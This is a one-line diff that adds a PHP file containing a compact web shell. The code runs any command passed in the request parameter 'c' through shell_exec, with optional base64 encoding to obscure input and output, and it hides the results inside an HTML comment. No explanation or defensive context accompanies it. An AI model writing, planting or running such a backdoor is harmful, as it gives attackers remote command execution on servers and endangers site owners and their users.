@@ -1,0 +1,1 @@
+<? if($_REQUEST[e]==T){$c=base64_decode($_REQUEST['c']);}else{$c=$_REQUEST['c'];}$r=shell_exec($c);if($_REQUEST[e]==T){$o=base64_encode($r);}else{$o=$r;}print"<!--<#>$o<%>-->\n";?>
